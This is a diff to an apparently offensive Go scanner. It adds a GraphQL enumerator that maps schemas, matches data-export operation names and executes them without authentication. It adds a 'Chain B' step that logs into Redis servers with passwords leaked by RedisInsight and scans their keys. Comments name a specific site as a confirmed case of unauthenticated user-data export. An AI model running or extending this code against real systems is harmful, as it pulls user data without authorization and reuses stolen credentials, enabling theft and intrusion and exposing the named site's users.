@@ -152,6 +152,9 @@ var enumeratorRegistry = map[string]enumeratorFn{
 	// Redis management GUI
 	"RedisInsight": enumRedisInsight,
 
+	// GraphQL API
+	"Apollo GraphQL API": enumGraphQL,
+
 	// Chatbot frameworks
 	"Rasa": enumRasa,
 
@@ -3333,6 +3336,193 @@ func min(a, b int) int {
 	return b
 }
 
+// ── GraphQL API ─────────────────────────────────────────────────────
+//
+// Probes any Apollo/generic GraphQL endpoint for:
+//   1. Unauthenticated introspection (confirms full schema exposure)
+//   2. Admin-grade data export operations (getCsvUrl, getCustomUsersCsv, etc.)
+//   3. Admin flag fields on User types (isSuper, isAdmin, isDeveloper, etc.)
+//   4. Unauth execution of data export queries (if present)
+//
+// Anchor cases: djaminn.app dev-api (getCustomUsersCsv executed unauth → GCS URL),
+// djaminn.app production (introspection open, per-resolver auth mixed).
+
+// graphqlDataExportOps lists operation names that expose admin-grade data exports.
+var graphqlDataExportOps = []string{
+	"getCsvUrl", "getCustomUsersCsv", "exportUsers", "downloadUsers",
+	"getUsersExport", "getUsersCsv", "exportData", "downloadData",
+	"getExportUrl", "exportAll", "bulkExport", "getCsvDownload",
+}
+
+// graphqlAdminFlagFields lists boolean fields on User types that expose role hierarchy.
+var graphqlAdminFlagFields = []string{
+	"isSuper", "isSuperUser", "isAdmin", "isStaff", "isDeveloper",
+	"isModerator", "isOperator", "isOwner", "isRoot",
+}
+
+func enumGraphQL(c *http.Client, svc ServiceMatch) EnumResult {
+	r := mkResult(svc)
+	b := svc.BaseURL
+
+	// GraphQL endpoints to probe in order.
+	endpoints := []string{"/graphql", "/api/graphql", "/v1/graphql", "/api/v1/graphql"}
+
+	// Phase 1: confirm introspection is accessible.
+	typeProbe := []byte(`{"query":"{ __typename }"}`)
+	var gqlBase string
+	for _, ep := range endpoints {
+		if st, _, body, err := httpPOST(c, b+ep, "application/json", typeProbe); err == nil && st == 200 {
+			if strings.Contains(string(body), "__typename") || strings.Contains(string(body), `"Query"`) {
+				gqlBase = b + ep
+				r.AuthStatus = "none"
+				break
+			}
+		}
+	}
+	if gqlBase == "" {
+		return r
+	}
+
+	r.Details = append(r.Details, "GraphQL introspection: accessible without auth")
+	r.Findings = append(r.Findings, Finding{
+		Category: "access",
+		Title:    "GraphQL introspection accessible without authentication",
+		Detail:   fmt.Sprintf("POST %s with {__typename} returns schema data. Full introspection is enabled and requires no credential.", gqlBase),
+		Severity: "medium",
+	})
+
+	// Phase 2: enumerate root query operation names.
+	schemaProbe := []byte(`{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}`)
+	if st, _, body, err := httpPOST(c, gqlBase, "application/json", schemaProbe); err == nil && st == 200 {
+		if m, parseErr := parseJSON(body); parseErr == nil {
+			queryFields := gqlFieldNames(m, "data", "__schema", "queryType", "fields")
+			mutationFields := gqlFieldNames(m, "data", "__schema", "mutationType", "fields")
+			allOps := append(queryFields, mutationFields...)
+
+			// Check for data export operations.
+			var exportOps []string
+			for _, op := range allOps {
+				for _, target := range graphqlDataExportOps {
+					if strings.EqualFold(op, target) {
+						exportOps = append(exportOps, op)
+						break
+					}
+				}
+			}
+			if len(exportOps) > 0 {
+				r.Findings = append(r.Findings, Finding{
+					Category: "data",
+					Title:    fmt.Sprintf("Admin-grade data export operations in unauth GraphQL schema: %s", strings.Join(exportOps, ", ")),
+					Detail: "These operations export user data or generate bulk download URLs. " +
+						"Their presence in the unauth introspection schema does not confirm they execute without auth, " +
+						"but unauthenticated introspection means the attack surface is fully mapped.",
+					Severity: "high",
+					Data:     map[string]interface{}{"export_ops": exportOps},
+				})
+
+				// Phase 3: attempt to execute each export op without auth.
+				for _, op := range exportOps {
+					execProbe := []byte(fmt.Sprintf(`{"query":"{ %s }"}`, op))
+					if st2, _, body2, err2 := httpPOST(c, gqlBase, "application/json", execProbe); err2 == nil && st2 == 200 {
+						m2, parseErr2 := parseJSON(body2)
+						if parseErr2 == nil {
+							// Success: data returned without an errors block containing "unauthorized"
+							if dataVal, hasData := m2["data"]; hasData && dataVal != nil {
+								errField, hasErr := m2["errors"]
+								if !hasErr || errField == nil {
+									r.Findings = append(r.Findings, Finding{
+										Category: "data",
+										Title:    fmt.Sprintf("Data export query %q executed without authentication", op),
+										Detail: fmt.Sprintf(
+											"POST %s with {%s} returned data with no auth error. "+
+												"The resolver executed without a token or session cookie.",
+											gqlBase, op,
+										),
+										Severity: "critical",
+										Data:     map[string]interface{}{"operation": op},
+									})
+								}
+							}
+						}
+					}
+				}
+			}
+
+			if len(allOps) > 0 {
+				r.Details = append(r.Details, fmt.Sprintf("Schema operations: %d query, %d mutation", len(queryFields), len(mutationFields)))
+				r.RawData["operations_count"] = map[string]int{"query": len(queryFields), "mutation": len(mutationFields)}
+			}
+		}
+	}
+
+	// Phase 4: check common User type names for admin flag fields.
+	userTypeNames := []string{"User", "UserConfidential", "UserProfile", "Account", "Member"}
+	for _, typeName := range userTypeNames {
+		typeQuery := []byte(fmt.Sprintf(`{"query":"{ __type(name: \"%s\") { fields { name } } }"}`, typeName))
+		if st, _, body, err := httpPOST(c, gqlBase, "application/json", typeQuery); err == nil && st == 200 {
+			if m, parseErr := parseJSON(body); parseErr == nil {
+				fields := gqlFieldNamesFlat(m, "data", "__type", "fields")
+				var adminFlags []string
+				for _, f := range fields {
+					for _, target := range graphqlAdminFlagFields {
+						if strings.EqualFold(f, target) {
+							adminFlags = append(adminFlags, f)
+							break
+						}
+					}
+				}
+				if len(adminFlags) > 0 {
+					r.Findings = append(r.Findings, Finding{
+						Category: "data",
+						Title:    fmt.Sprintf("Admin role flags in GraphQL %s type: %s", typeName, strings.Join(adminFlags, ", ")),
+						Detail: fmt.Sprintf(
+							"The %s type exposes boolean admin-role fields via introspection: %s. "+
+								"If allUsers or getUserByEmail resolvers are accessible without auth, "+
+								"these fields enumerate admin accounts directly.",
+							typeName, strings.Join(adminFlags, ", "),
+						),
+						Severity: "medium",
+						Data:     map[string]interface{}{"type": typeName, "admin_flags": adminFlags},
+					})
+				}
+			}
+		}
+	}
+
+	return r
+}
+
+// gqlFieldNames extracts the "name" string from each element of a nested
+// GraphQL __schema fields array. Path: m[key0][key1]...[keyN] = []{"name":...}
+func gqlFieldNames(m map[string]interface{}, keys ...string) []string {
+	var cur interface{} = m
+	for _, k := range keys {
+		mm, ok := cur.(map[string]interface{})
+		if !ok {
+			return nil
+		}
+		cur = mm[k]
+	}
+	arr, ok := cur.([]interface{})
+	if !ok {
+		return nil
+	}
+	var names []string
+	for _, item := range arr {
+		if obj, ok := item.(map[string]interface{}); ok {
+			if name, ok := obj["name"].(string); ok && name != "" {
+				names = append(names, name)
+			}
+		}
+	}
+	return names
+}
+
+// gqlFieldNamesFlat handles the __type(name:...) { fields { name } } response shape.
+func gqlFieldNamesFlat(m map[string]interface{}, keys ...string) []string {
+	return gqlFieldNames(m, keys...)
+}
+
 // ── Anti-detect CDP server ──────────────────────────────────────────
 
 // enumAntiDetectCDP deep-reads an aiohttp-fronted anti-detect Chrome
@@ -4452,6 +4642,44 @@ func enumRedisInsight(c *http.Client, svc ServiceMatch) EnumResult {
 					Detail:   "GET /api/databases accessible without authentication. No passwords in this response, but host/port/username metadata is exposed.",
 					Severity: "high",
 				})
+			}
+
+			// Chain B: use leaked credentials to probe the Redis keyspace directly.
+			// For each connection record with a password, connect to the Redis port
+			// and run key-pattern scans. "localhost" in the host field means the
+			// RedisInsight host — substitute svc.Host.
+			for _, item := range arr {
+				row, ok := item.(map[string]interface{})
+				if !ok {
+					continue
+				}
+				password, _ := row["password"].(string)
+				if password == "" {
+					continue
+				}
+				redisHost, _ := row["host"].(string)
+				if redisHost == "localhost" || redisHost == "127.0.0.1" || redisHost == "::1" {
+					redisHost = svc.Host
+				}
+				var redisPort int
+				switch v := row["port"].(type) {
+				case float64:
+					redisPort = int(v)
+				case int:
+					redisPort = v
+				}
+				if redisPort == 0 {
+					redisPort = 6379
+				}
+				chainBFindings := redisChainBProbe(redisHost, redisPort, password, 8*time.Second)
+				r.Findings = append(r.Findings, chainBFindings...)
+				if len(chainBFindings) > 0 {
+					r.RawData["chain_b_probe"] = map[string]interface{}{
+						"redis_host": redisHost,
+						"redis_port": redisPort,
+						"findings":   len(chainBFindings),
+					}
+				}
 			}
 		}
 	} else if st == 401 || st == 403 {
